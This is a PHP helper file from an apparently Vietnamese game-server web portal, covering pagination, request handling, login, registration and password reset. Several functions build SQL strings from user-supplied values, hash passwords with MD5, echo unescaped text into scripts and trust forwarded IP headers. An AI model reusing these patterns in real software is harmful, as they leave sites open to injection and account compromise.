<?php

/*
	$paging = new pagintion_temp();

	$paging->class_pagination = "light-theme simple-pagination pagination";// ĐẶT CLASS CHO THÀNH PHẦN PHÂN TRANG THEO Ý MUỐN
	$paging->class_active = "current"; // TEN CLASS Active
	$paging-> page = $page;// TRANG HIỆN TẠI
    $paging-> total = $total; // TONG SO RECORD
    $paging-> per_page=$per_page; // SỐ RECORD TRÊN 1 TRANG default = 10
    $paging-> adjacents = $adjacents; // SỐ PAGE  CENTER DEFAULT = 3
    $paging-> name_page ='page'; // GET NAMEPAGE  LẤY GIÁ TRỊ PAGE THÔNG QUA PHƯƠNG THỨC POST OR GET
    $paging-> name_per_page ='per_page'; // GET NAMEPAGE  LẤY GIÁ TRỊ PAGE THÔNG QUA PHƯƠNG THỨC POST OR GET
    $paging-> cn_url_modify = 'mod=editnews';//	THÔNG SỐ SUA URL VOI FUNCTION CN_URL_MODIFY

	//goi...
	$get_paging= $paging->Load();
	*/

// PRE 1 2 3 ... 4 5 6 7 8 9 10 ... 13 14 NEXT 	// 14 PAGE
class pagintion_temp
{
    public $total; // TONG SO PAGE
    public $per_page = 10; // SỐ RECORD TRÊN 1 TRANG default = 10
    public $adjacents = 3; // SỐ PAGE  CENTER
    public $page; // SỐ PAGE
    public $name_page = 'page'; // GET NAME PAGE
    public $name_per_page = 'per_page'; // GET NAME PER PAGE
    public $url_modify = '';//cn_url_modify('mod=cashshop', '__item', '_id', 'do=action', "opt=".$opt);//	THÔNG SỐ SUA URL VOI FUNCTION CN_URL_MODIFY
    public $class_pagination = 'light-theme simple-pagination pagination'; // TÊN CÁC CLASS
    public $class_active = 'current'; // TEN CLASS Active

    private $start;
    private $prev;
    private $next;
    private $lastpage;
    private $lpm1;
    private $variablesParam = '&amp;';

    public function Load()
    {

        //if($this->page)
        //$this -> start = ($this ->page - 1) * $this ->per_page; //first item to display on this page
        //else{
        //$this ->start = 0;
        //}

        /* Setup page vars for display. */
        if ($this->page == 0) $this->page = 1; //if no page var is given, default to 1.
        $this->prev = $this->page - 1; //previous page is $this->class_active page - 1
        $this->next = $this->page + 1; //next page is $this->class_active page + 1
        $this->lastpage = ceil($this->total / $this->per_page); //lastpage.
        $this->lpm1 = $this->lastpage - 1; //last page minus 1

        if ($this->url_modify == '') $this->variablesParam = '?';

        /* CREATE THE PAGINATION */

        $pagination = "";
        if ($this->lastpage > 1) {
            $pagination .= "<div class='$this->class_pagination'> <ul>";

            if ($this->page > 1) {
                $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . $this->prev . " class='page-link prev' title='Prev'>Prev</a></li>";
            } elseif ($this->page == 1)
                $pagination .= "<li><a rel='nofollow' href='' class='$this->class_active' title='Prev'>Prev</a></li>";

            if ($this->lastpage < 7 + ($this->adjacents * 2)) { // so trang < 13 = so bt hien thi
                for ($counter = 1; $counter <= $this->lastpage; $counter++) {
                    if ($counter == $this->page)
                        $pagination .= "<li><a rel='nofollow' href='#' class='$this->class_active' title='Page number $counter'>$counter</a></li>";
                    else
                        $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . $counter . " class='page-link' title='Page number $counter'>$counter</a></li>";
                }
            } elseif ($this->lastpage > 5 + ($this->adjacents * 2)) { //enough pages to hide some so trang >11
                //close to beginning; only hide later pages
                if ($this->page < 1 + ($this->adjacents * 2)) { //  hien tai < 7...... => hientai 1 2 3 4 5 6 7 => hien 1 2 3 4 5 6 7 8 9
                    for ($counter = 1; $counter < 4 + ($this->adjacents * 2); $counter++) { //$counter < 9 + (2 tr cuoi)
                        if ($counter == $this->page)
                            $pagination .= "<li><a rel='nofollow' href='#' class='$this->class_active' title='Page number $counter'>$counter</a></li>";
                        else
                            $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . $counter . " class='page-link' title='Page number $counter'>$counter</a></li>";
                    }

                    $pagination .= "<li>...</li>";
                    $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . $this->lpm1 . " class='page-link' title='Page number $this->lpm1'>$this->lpm1</a></li>";
                    $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . $this->lastpage . " class='page-link' title='Page number $this->lastpage'>$this->lastpage</a></li>";
                } //in middle; hide some front and some back
                elseif ($this->lastpage - ($this->adjacents * 2) > $this->page && $this->page > ($this->adjacents * 2)) { // so tr - 6 > hientai  hienta > 6

                    $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . 1 . " class='page-link' title='1'>1</a></li>";        // trang dau 1
                    $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . 2 . " class='page-link' title='2'>2</a></li>";        // trang thu 2
                    $pagination .= "<li>...</li>";
                    for ($counter = $this->page - $this->adjacents; $counter <= $this->page + $this->adjacents; $counter++) { // 1 2 3 hientai 5 6 7  (tong 7)

                        if ($counter == $this->page)
                            $pagination .= "<li><a rel='nofollow' href='#' class='$this->class_active' title='Page number $counter'>$counter</a></li>";
                        else
                            $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . $counter . " class='page-link' title='Page number $counter'>$counter</a></li>";
                    }

                    $pagination .= "<li>...</li>";

                    $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . $this->lpm1 . " class='page-link' title='Page number $this->lpm1'>$this->lpm1</a></li>"; // trang cuoi - 1
                    $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . $this->lastpage . " class='page-link' title='Page number $this->lastpage'>$this->lastpage</a></li>";  // trang cuoi

                } //close to end; only hide early pages
                else {
                    $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . 1 . " class='page-link' title='1'>1</a></li>";
                    $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . 2 . " class='page-link' title='2'>2</a></li>";
                    $pagination .= "<li>...</li>";

                    for ($counter = $this->lastpage - (2 + ($this->adjacents * 2)); $counter <= $this->lastpage; $counter++) {  // chi so = tong - 8; chi so < tong class="$this->class_active"
                        if ($counter == $this->page) {
                            $pagination .= "<li><a rel='nofollow' href='#' class='$this->class_active' title='Page number $counter'>$counter</a></li>";
                        } else {
                            $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . $counter . " class='page-link' title='Page number $counter'>$counter</a></li>";
                        }
                    }
                }
            }

            //next button
            if (($this->page >= 1) && $this->page < $this->lastpage) {
                $pagination .= "<li><a href=" . $this->url_modify . $this->variablesParam . $this->name_per_page . '=' . $this->per_page . '&amp;' . $this->name_page . '=' . $this->next . " class='page-link' title='Next'>Next</a></li>";
            } elseif ($this->page == $this->lastpage) {
                $pagination .= "<li><a rel='nofollow' href='' class='$this->class_active' title='Next'>Next</a></li>";
            }

            $pagination .= "</ul></div>\n";
        }
        return $pagination;
    }
}

/**
 * @param $array
 * @param $_url
 * @param $page
 * @param $per_page
 * @param int $adjacents
 * @param string $name_per_page
 * @param string $name_page
 * @param string $class_active
 * @param string $class_pagination
 * @return array
 */
function cn_arr_pagina($array, $_url, $page, $per_page, $adjacents = 3, $name_per_page = 'per_page', $name_page = 'page', $class_active = 'current', $class_pagination = 'light-theme simple-pagination pagination')
{
    //$paging-> total = $total = count($array); // TONG SO PAGE
    //$paging-> cn_url_modify = $cn_url_modify;
    $arr = array();
    $paging = new pagintion_temp();

    $paging->class_pagination = $class_pagination;// ĐẶT CLASS CHO THÀNH PHẦN PHÂN TRANG THEO Ý MUỐN
    $paging->class_active = $class_active; // TEN CLASS Active
    $paging->page = $page;        // TRANG
    $paging->total = $total = count($array); // TONG SO RECODE
    $paging->per_page = $per_page; // SỐ RECODE TRÊN 1 TRANG default = 10
    $paging->adjacents = $adjacents; // SỐ PAGE  CENTER DEFAULT = 3
    $paging->name_page = $name_page; // GET NAMEPAGE  LẤY GIÁ TRỊ PAGE THÔNG QUA PHƯƠNG THỨC POST OR GET
    $paging->name_per_page = $name_per_page; // GET NAMEPAGE  LẤY GIÁ TRỊ PAGE THÔNG QUA PHƯƠNG THỨC POST OR GET
    $paging->url_modify = $_url;//	THÔNG SỐ SUA URL VOI FUNCTION CN_URL_MODIFY

    if ($page <= 0) $page_end = $per_page;
    else if ($page != 0) $page_end = $per_page * $page;

    $page_frist = (--$page_end) - $per_page;

    $_id = 0;
    //for($id = 0; $id < $total; $id++){
    foreach ($array as $key => $raw) {
        //if($id > $page_end) break;
        if ($page_frist < $_id && $_id <= $page_end) $arr[$key] = $array[$key];
        ++$_id;
    }

    //goi...
    $get_paging = $paging->Load();

    return array($arr, $get_paging);
}

/**
 * @param $countArray
 * @param $_url
 * @param $page
 * @param $per_page
 * @param int $adjacents
 * @param string $name_per_page
 * @param string $name_page
 * @param string $class_active
 * @param string $class_pagination
 * @return string
 */
function cn_countArr_pagination($countArray, $_url, $page, $per_page, $adjacents = 3, $name_per_page = 'per_page', $name_page = 'page', $class_active = 'current', $class_pagination = 'light-theme simple-pagination pagination')
{
    $paging = new pagintion_temp();

    $paging->class_pagination = $class_pagination;// ĐẶT CLASS CHO THÀNH PHẦN PHÂN TRANG THEO Ý MUỐN
    $paging->class_active = $class_active; // TEN CLASS Active
    $paging->page = $page;        // TRANG
    $paging->total = $countArray; // TONG SO RECODE
    $paging->per_page = $per_page; // SỐ RECODE TRÊN 1 TRANG default = 10
    $paging->adjacents = $adjacents; // SỐ PAGE  CENTER DEFAULT = 3
    $paging->name_page = $name_page; // GET NAMEPAGE  LẤY GIÁ TRỊ PAGE THÔNG QUA PHƯƠNG THỨC POST OR GET
    $paging->name_per_page = $name_per_page; // GET NAMEPAGE  LẤY GIÁ TRỊ PAGE THÔNG QUA PHƯƠNG THỨC POST OR GET
    $paging->url_modify = $_url; //	THÔNG SỐ SUA URL VOI FUNCTION CN_URL_MODIFY

    return $paging->Load();
}

function cn_url_modify()
{
    global $PHP_SELF;
    $GET = $_GET;
    $args = func_get_args();
    $SN = $PHP_SELF;

    // add new params
    foreach ($args as $ks) {
        // 1) Control
        if (is_array($ks)) {
            foreach ($ks as $vs) {
                $id = $val = '';

                if (strpos($vs, '=') !== FALSE) {
                    list($id, $var) = explode('=', $vs, 2);
                } else {
                    $id = $vs;
                }
                if ($id == 'self') {
                    $SN = $var;
                } elseif ($id == 'reset') {
                    $GET = array();
                } elseif ($id == 'group') {
                    foreach ($vs as $a => $b) {
                        $GET[$a] = $b;
                    }
                }
            }
        } // 2) Subtract
        elseif (strpos($ks, '=') === FALSE) {
            $keys = explode(',', $ks);

            foreach ($keys as $key) {
                $key = trim($key);
                if (isset($GET[$key])) {
                    unset($GET[$key]);
                }
            }
        } // 3) Add
        else {
            list($k, $v) = explode('=', $ks, 2);

            $GET[$k] = $v;
            if ($v === '') {
                unset($GET[$k]);
            }
        }
    }

    return cn_pack_url($GET, $SN);
}

// Since 2.0: Extended extract
function _GL($v)
{
    $vs = explode(',', $v);
    $result = array();
    foreach ($vs as $vc) {
        $el = explode(':', $vc, 2);
        $vc = isset($el[0]) ? $el[0] : false;
        $func = isset($el[1]) ? $el[1] : false;
        $var = false;
        if ($vc) $var = isset($GLOBALS[trim($vc)]) ? $GLOBALS[trim($vc)] : false;
        if ($func) $var = call_user_func($func, $var);
        $result[] = $var;
    }

    return $result;
}

/*  ---------- Sanitize: get POST vars (default) --------
    POST [def] only POST
    GET only GET
    POSTGET -- or POST or GET
    GETPOST -- or GET or POST
    REQUEST -- from REQUEST
    COOKIES -- from COOKIES
    GLOB -- from GLOBALS
    + combination (comma separated)
*/

// Since 1.5.3
function GET($var, $method = 'GETPOST')
{
    $result = array();
    $vars = spsep($var);
    $method = strtoupper($method);

    if ($method == 'GETPOST') {
        $methods = array('GET', 'POST');
    } elseif ($method == 'POSTGET') {
        $methods = array('POST', 'GET');
    } elseif ($method == 'GPG') {
        $methods = array('POST', 'GET', 'GLOB');
    } else {
        $methods = spsep($method);
    }

    foreach ($vars as $var) {
        $var = trim($var);
        $value = null;

        foreach ($methods as $method) {
            if ($method == 'GLOB' && isset($GLOBALS[$var])) {
                $value = $GLOBALS[$var];
            } elseif ($method == 'POST' && isset($_POST[$var])) {
                $value = $_POST[$var];
            } elseif ($method == 'GET' && isset($_GET[$var])) {
                $value = $_GET[$var];
            } elseif ($method == 'POSTGET') {
                if (isset($_POST[$var])) {
                    $value = $_POST[$var];
                } elseif (isset($_GET[$var])) {
                    $value = $_GET[$var];
                }
            } elseif ($method == 'GETPOST') {
                if (isset($_GET[$var])) {
                    $value = $_GET[$var];
                } elseif (isset($_POST[$var])) {
                    $value = $_POST[$var];
                }
            } elseif ($method == 'REQUEST' && isset($_REQUEST[$var])) {
                $value = $_REQUEST[$var];
            } elseif ($method == 'COOKIE' && isset($_COOKIE[$var])) {
                $value = $_COOKIE[$var];
            }

            if (!is_null($value)) {
                break;
            }
        }

        $result[] = $value;
    }
    return $result;
}

// Since 1.5.0
// Separate string to array: imporved "explode" function
function spsep($separated_string, $seps = ',')
{
    if (strlen($separated_string) == 0) {
        return array();
    }
    $ss = explode($seps, $separated_string);
    return $ss;
}

// Since 2.0: Cutenews HtmlSpecialChars
function cn_htmlspecialchars($_str)
{
    $key = array('&' => '&amp;', '"' => '&quot;', "'" => '&#039;', '<' => '&lt;', '>' => '&gt;');
    $matches = null;
    preg_match('/(&amp;)+?/', $_str, $matches);
    if (count($matches) != 0) {
        array_shift($key);
    }
    return str_replace(array_keys($key), array_values($key), $_str);
}


// Since 1.5.3
// GET Helper for single value
// $method[0] = * ---> htmlspecialchars ON
function REQ($var, $method = 'GETPOST')
{
    if ($method[0] == '*') {
        list($value) = (GET($var, substr($method, 1)));
        return cn_htmlspecialchars($value);
    } else {
        list($value) = GET($var, $method);
        return $value;
    }
}

// Since 2.0: Check server request type
function request_type($type = 'POST')
{
    return $_SERVER['REQUEST_METHOD'] === $type ? TRUE : FALSE;
}


// Since 2.0: Show breadcrumbs
function cn_snippet_bc($sep = '&gt;')
{
    $bc = mcache_get('.breadcrumbs');

    $opt = REQ('opt', 'GPG');
    if (!$opt) $opt = '';

    echo '<div id="mainsub_title" class="cn_breadcrumbs">';

    $ls = array();
    if (is_array($bc)) {
        foreach ($bc as $key => $item) {
            if ($key != $opt)
                $ls[] = '<span class="bcitem"><a href="' . $item['url'] . '">' . cn_htmlspecialchars($item['name']) . '</a></span>';
            else
                $ls[] .= '<span class="bcitem">' . cn_htmlspecialchars($item['name']) . '</span>';
        }
    }
    echo join(' <span class="bcsep">' . $sep . '</span> ', $ls);
    echo '</div>';
}

// Since 2.0: Show breadcrumbs BY
// Home > name
function cn_snippet_bc_re($home_ = 'Home', $_name_bread = null, $sep = '&gt;')
{
    $bc = mcache_get('.breadcrumbs');
    $result = '<div id="mainsub_title" class="cn_breadcrumbs"><span class="bcitem"><a href="' . PHP_SELF . '">' . cn_htmlspecialchars($home_) . '</a></span>';

    //if(is_array($bc)) $result .='<span class="bcsep"> '.$sep.' </span>';
    $maxs = count($bc) - 1;

    $ls = array();
    if (is_array($bc)) {
        $result .= '<span class="bcsep"> ' . $sep . ' </span>';
        foreach ($bc as $key => $item) {

            //if(is_null($_name_bread)){
            if ($key != $maxs)// && is_null($_name_bread))
                $ls[] = '<span class="bcitem"><a href="' . $item['url'] . '">' . cn_htmlspecialchars($item['name']) . '</a></span>';
            else
                $ls[] .= '<span class="bcitem">' . cn_htmlspecialchars($item['name']) . '</span>';
            //}
            //else
            //$ls[] = '<span class="bcitem"><a href="'.$item['url'].'">'.cn_htmlspecialchars($item['name']).'</a></span>';

        }
    }
    //if($ls)
    $result .= join(' <span class="bcsep">' . $sep . '</span> ', $ls);

    //else
    //$result .= '<span class="bcsep"> '.$sep.' </span>';

    if (!is_null($_name_bread) && $_name_bread)
        $result .= '<span class="bcsep"> ' . $sep . ' </span><span class="bcitem">' . cn_htmlspecialchars($_name_bread) . '</span>';


    $result .= "</div>";

    return $result;
}

function cn_load_session()
{
    @session_start();
}

// Since 1.5.1: Validate email
function check_email($email)
{
    return (preg_match("/^[\.A-z0-9_\-\+]+[@][A-z0-9_\-]+([.][A-z0-9_\-]+)+[A-z]{1,4}$/", $email));
}

// Since 2.0: Extended assign
function cn_assign()
{
    $args = func_get_args();
    $keys = explode(',', array_shift($args));

    foreach ($args as $id => $arg) {
        // Simple assign
        if (isset($keys[$id])) {
            $KEY = trim($keys[$id]);
            $GLOBALS[$KEY] = $arg;
        } else // Inline assign
        {
            list($k, $v) = explode('=', $arg, 2);
            $GLOBALS[$k] = $v;
        }
    }
}

// Since 2.0: Get messages
function cn_get_message($area, $method = 's') // s-show, c-count
{
    $es = mcache_get('msg:stor');
    if (isset($es[$area])) {
        if ($method == 's') return $es[$area];
        elseif ($method == 'c') return count($es[$area]);
    }
    return null;
}

// Since 2.0; HTML show errors
function cn_messages_show($arrNotify, $notify)
{
    $delay = 7500;
    $result = '';
    if (empty($arrNotify))
        return $result;

    $type = 'notify';
    if ($notify == 'e') {
        $type = 'error';
    } elseif ($notify == 'w') {
        $type = 'warnings';
    }

    $result .= '<div class="cn_' . $type . '_list">';

    foreach ($arrNotify as $msg) {
        $NID = 'notify_' . ctime() . mt_rand();
        $result .= '<div class="cn_' . $type . '_item" id="' . $NID . '"><div><b>' . date('H:i:s', ctime()) . '</b> ' . $msg . '</div></div>';
        $result .= '<script>notify_auto_hide("' . $NID . '", ' . $delay . ');</script>';

        $delay += 1000;
    }
    $result .= '</div>';


    if ($result) {
        echo '<div class="cn_notify_overall">' . $result . '</div>';
    }
}

// Since 2.0; HTML show errors
function cn_snippet_messages($area = 'new')
{
    $delay = 7500;
    $result = '';

    for ($i = 0; $i < strlen($area); $i++) {
        $messages = cn_get_message($area[$i], 's');

        $type = 'notify';
        if ($area[$i] == 'e') {
            $type = 'error';
        } elseif ($area[$i] == 'w') {
            $type = 'warnings';
        }

        if ($messages) {
            $result .= '<div class="cn_' . $type . '_list">';
            foreach ($messages as $msg) {
                $NID = 'notify_' . ctime() . mt_rand();
                $result .= '<div class="cn_' . $type . '_item" id="' . $NID . '"><div><b>' . date('H:i:s', ctime()) . '</b> ' . $msg . '</div></div>';
                $result .= '<script>notify_auto_hide("' . $NID . '", ' . $delay . ');</script>';

                $delay += 1000;
            }
            $result .= '</div>';
        }
    }

    if ($result) {
        return '<div class="cn_notify_overall">' . $result . '</div>';
    }
}

// Since 2.0: @bootstrap
function cn_detect_user_ip()
{
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $IP = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $IP = $_SERVER['HTTP_CLIENT_IP'];
    }

    if (empty($IP) && isset($_SERVER['REMOTE_ADDR'])) {
        $IP = $_SERVER['REMOTE_ADDR'];
    }
    if (empty($IP)) {
        $IP = false;
    }

    if (!preg_match('/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/', $IP)) {
        $IP = '';
    }

    define('CLIENT_IP', $IP);
    // CRYPT_SALT consists an IP
    define('CRYPT_SALT', (getoption('ipauth') == '1' ? CLIENT_IP : '') . '@' . getoption('#crypt_salt'));
}

function alert_message($str)
{
    echo "<script> alert('$str'); </script>";
}

function member_get()
{
    // Not authorized
    if (empty($_SESSION['user_Gamer'])) {
        return null;
    }

    // No in cache
    if ($member = mcache_get('#member')) {
        return $member;
    }

    mcache_set('#member', $user = db_user_by_name($_SESSION['user_Gamer']));
    //foreach($user as $fg => $r) echo "585 uers==> $fg => $r <br>";
    return $user;
}

// Since 1.5.0: Hash type MD5 and SHA256
function hash_generate($password, $md5hash = false)
{
    $md5_ = md5($password);
    $try = array
    (
        0 => $md5_,
        1 => utf8decrypt($password, $md5hash),
        2 => SHA256_hash($password),
        3 => substr($md5_, 10, 10),
    );

    return $try;
}

// Since 1.5.3: UTF8-Cutenews compliant
function utf8decrypt($str, $oldhash)
{
    $len = strlen($str) * 3;
    while ($len >= 16) $len -= 16;
    $len = floor($len / 2);
    $salt = substr($oldhash, $len, 10);
    $pass = SHA256_hash($salt . $str . '`>,');
    $pass = substr($pass, 0, $len) . $salt . substr($pass, $len);
    return $pass;
}

// Since 2.0: Test User ACL. Test for groups [user may consists requested group]
function test($requested_acl, $requested_user = NULL, $is_self = FALSE)
{
    $user = member_get(); // get user menber session

    // Deny ANY access of unathorized member
    if (!$user) return FALSE;

    $acl = $user['acl'];
    $grp = getoption('#grp');
    $ra = spsep($requested_acl);

    // This group not exists, deny all
    if (!isset($grp[$acl]))
        return FALSE;

    // Decode ACL, GRP string
    $gp = spsep($grp[$acl]['G']);
    $rc = spsep($grp[$acl]['A']);


    // ra la bien truyen vao
    // If requested acl not match with real allowed, break
    foreach ($ra as $Ar) {
        if (!in_array($Ar, $rc)) return FALSE;
    }

    // Test group or self
    if ($requested_user) {
        // if self-check, check name requested user and current user
        if ($is_self && $requested_user['user_Gamer'] !== $user['name']) // xac ding user truyen vao <=> user hien tai
            return FALSE;

        // if group check, check: requested uses may be in current user group
        if (!$is_self) {
            if ($gp && !in_array($requested_user['acl'], $gp))  //kiem tra user truyen vao user[acl]  <=> phan quyen trong nhom
                return FALSE;
            elseif (!$gp)                                        //ko ton tai phan quyen
                return FALSE;
        }
    }

    return TRUE;
}


// Since 2.0: Show login form
function cn_login_form($admin = TRUE)
{
    return exec_tpl('_authen/login');
}

function cn_login()
{
    if (isset($_SESSION['timeOutLogin']) && $_SESSION['timeOutLogin'] < ctime()) {
        cn_logout();
    }
    if (isset($_SESSION['timeOutLogin'])) {
        $_SESSION['timeOutLogin'] = ctime() + 300;
    }
    // Get logged username
    $logged_username = isset($_SESSION['user_Gamer']) ? $_SESSION['user_Gamer'] : FALSE;

    // Check user exists. If user logged, but not exists, logout now
    //if ($logged_username && !db_user_by_name($logged_username))
    //{
        //cn_logout();
    //}

    $is_logged = false;

    list($action) = GET('action', 'GET,POST');
    list($username, $password) = GET('Account, Password', 'POST');
    // user not authorized now

    if (!$logged_username) {
        // last url for return after user logged in
        if ($_SERVER['REQUEST_METHOD'] == 'GET') {
            $_SESSION['RQU'] = preg_replace('/[^\/\.\?\=\&a-z_0-9]/i', '', $_SERVER['REQUEST_URI']);
        }

        if ($action == 'dologin') {
            if ($username && $password) {
                $errors_fa = false;
                $username = trim(htmlentities($username));

                if (kiemtra_acc($username)) {
                    cn_throw_message("Tài khoản không tồn tại.", 'e');
                    $errors_fa = true;
                }
                if (kiemtra_block_acc($username)) {
                    cn_throw_message("Tài khoản đang bị khóa.", 'e');
                    $errors_fa = true;
                }

                if (!$errors_fa) {
                    $member = db_user_by_name($username);
                    if ($member) {

                        $ban_time = isset($member['ban_login']) ? (int)$member['ban_login'] : 0;

                        if ($ban_time && $ban_time > ctime()) {
                            msg_info('Too frequent queries. Wait ' . ($ban_time - ctime() . ' sec.'));
                        }
                        $compares = hash_generate($password);

                        if (!isset($member['pass_web'])) {
                            $member['pass_web'] = '';
                        }

                        if (in_array(trim($member['pass_web']), $compares)) {
                            $is_logged = true;

                            // set user to session
                            $_SESSION['user_Gamer'] = $username;
                            $_SESSION['timeOutLogin'] = ctime() + 300;
                    point_tax($username);

                            // save last login status, clear ban
                            //db_user_update($username, 'lts='.time(), 'ban=0');
                            do_update_character('MEMB_INFO', 'ban_login=0', "memb___id:'$username'");
                            // send return header (if exists)
                            if (isset($_SESSION['RQU'])) {
                                cn_relocation($_SESSION['RQU']);
                            }
                        } else {
                            cn_throw_message("Invalid password or login", 'e');
                            //cn_user_log('User "'.substr($username, 0, 32).'" ('.CLIENT_IP.') login failed');
                            do_update_character('MEMB_INFO', 'ban_login=' . (ctime() + getoption('ban_attempts')), "memb___id:'$username'");
                            //db_user_update($username, 'ban='.(time() + getoption('ban_attempts')));
                        }
                    }
                }
            } else {
                cn_throw_message('Enter login or password', 'e');
            }
        }
    } else {
        $is_logged = true;
    }

    if ($action == 'logout') {
        $is_logged = false;
        cn_logout();
    }

    // clear require url
    if ($is_logged && isset($_SESSION['RQU'])) {
        unset($_SESSION['RQU']);
    }

    return $is_logged;
}

// Since 2.0.3: Logout user and clean session
function cn_logout($relocation = PHP_SELF)
{
    //cn_cookie_unset();
    session_unset();
    session_destroy();
    cn_relocation($relocation);
}

// Since 2.0: Show register form
function cn_register_form($admin = TRUE)
{
    if (isset($_SESSION['user_Gamer'])) {
        return false;
    }

    // Active register
    if (isset($_GET['verifiregist']) && $_GET['verifiregist']) {

        $d_string = base64_decode($_GET['verifiregist']);
        $d_string = xxtea_decrypt($d_string, MD5(CLIENT_IP) . getoption('#crypt_salt'));
        $newHash = substr($d_string, 0, 64);
        $d_string = trim(strtolower(substr($d_string, 64)));

        if ($d_string) {
            $user = do_select_character('MEMB_INFO', 'memb___id,token_regist,date_resgit_email,mail_chek', "memb___id='$d_string'");

            if ($user) {
                if ($newHash != trim($user[0]['token_regist'])) msg_info('Đường dẫn không hợp lệ.');
                if (trim($user[0]['mail_check'])) msg_info('Tài khoản đã được kích hoạt.', 'index.php');

                if (ctime() > $user[0]['date_resgit_email']){
                    $statusDelete = do_delete_char("DELETE FROM MEMB_INFO WHERE memb___id ='". $d_string ."'");
                    if ($statusDelete){
                        msg_info('Bạn có thể sử dụng lại email để đăng ký.', 'index.php?register');
                    } else {
                        msg_info('Đã hết hạn kích hoạt tài khoản.');
                    }
                }

                $statusUp = do_update_character('MEMB_INFO', 'mail_chek=1', "acl=". ACL_LEVEL_JOURNALIST , "memb___id:'" . $d_string . "'");
                if ($statusUp) {
                    msg_info('Tài khoản đã được kích hoạt....', 'index.php');
                }
            } else {
                msg_info('Fail: Tài khoản không được xác thực');
            }
        }
        cn_relocation($_SERVER['SERVER_NAME']);
    }

    // Restore active status
    if (isset($_GET['lostpass']) && $_GET['lostpass']) {

        $d_string = base64_decode($_GET['lostpass']);
        $d_string = xxtea_decrypt($d_string, MD5(CLIENT_IP) . getoption('#crypt_salt'));
        $d_string = substr($d_string, 64);

        if ($d_string) {
            list($ctime, $d_username) = explode(' ', $d_string, 2);

            if ($ctime <ctime()) {
                msg_info('Đã hết hạn xác nhận quên mật khẩu.', 'index.html');
            }

            $d_username = strtolower($d_username);
            $user = do_select_character('MEMB_INFO', 'memb___id', "memb___id='$d_username'");

            // All OK: authorize user
            if(isset($user)) {
                //cn_throw_message('Vui lòng thay đổi mật khẩu', 'e');
                $_SESSION['user_ChangePwd'] = true;
                $_SESSION['user_Gamer'] = $d_username;
                cn_relocation(cn_url_modify(array('reset'), 'mod=manager_account', 'opt=change_pwd'));
            }
        }

        msg_info('Fail: Không xác nhận thay đổi mật khẩu.');
    }

    // Resend activation
    if (request_type('POST') && isset($_POST['registerweb']) && isset($_POST['lostpassweb'])) {

        $username = trim(strtolower(htmlentities(htmlspecialchars(REQ('usernameWeb')))));
        $emailweb = trim(strtolower(htmlentities(REQ('emailWeb'))));
        $user = do_select_character('MEMB_INFO', 'memb___id,mail_addr,memb__pwdmd5', "memb___id='$username'");

        if (!$user) {
            msg_info('Tài khoản hoặc địa chỉ email không đúng.');
        }

        $email = isset($user[0]['mail_addr']) ? trim($user[0]['mail_addr']) : '';

        // Check user name & mail
        if ($user && $email && $email == $emailweb) {
            $rand = $user[0]['memb__pwdmd5'];

            $ctime = ctime() + 86400;
            $url = getoption('http_script_dir') . '?lostpass=' . urlencode(base64_encode(xxtea_encrypt($rand . $ctime . ' ' . $username, MD5(CLIENT_IP) . getoption('#crypt_salt'))));

            $tmpHtmlEmailForgrot = 'Hi {username}, <br>
                <p>Click vào link dưới đây để xác nhận thay đổi mật khẩu</p>
                <a style="padding: 5px; color: red; background-color: blue; margin: 5px; cursor: pointer" href="{url}">Reset your password</a><br><hr>
                <i><em>Lưu ý: Xác nhận trong vòng 24h.</em></i>
            ';

            $strHoderFotgot = '{username}, {url}';
            $checkemailforgot = cn_send_mail($email, 'Resend activation link', cn_replace_text($tmpHtmlEmailForgrot, $strHoderFotgot, substr($username, 0, -4) . '****', $url));

            if ($checkemailforgot) {
                msg_info('Vui lòng kiểm tra lại email', 'index.php');
            } else {
                msg_info('Err, Gửi email thất bại, hãy thử lại sau');
            }
        } else {
            msg_info('Tài khoản hoặc địa chỉ email không đúng.');
        }

        msg_info('Tài khoản hoặc địa chỉ email không xác thực.');
    }

    // is not registration form
    if (is_null(REQ('register', 'GET')))
        return FALSE;

    // Lost password: disabled registration - no affected
    if (!is_null(REQ('lostpass', 'GET'))) {
        $Action = 'Lost password';
        $template = '_authen/lost';
        $template_name = 'Quên mật khẩu';
    } else {
        $register_OK = FALSE;
        $errors = array();
        list($username, $pwd, $re_pwd, $pass_web, $repass_web) = GET('nameAccount, pwd, re_pwd, pass_web, repass_web', "POST");
        list($ma7code, $nameQuestion, $nameAnswer, $nameEmail, $phoneNumber, $namecaptcha) = GET('num_7_verify, nameQuestion, nameAnswer, nameEmail, phoneNumber, nameCaptcha', "POST");

        $username = strtolower($username);
        $nameEmail = strtolower($nameEmail);

        // Do register
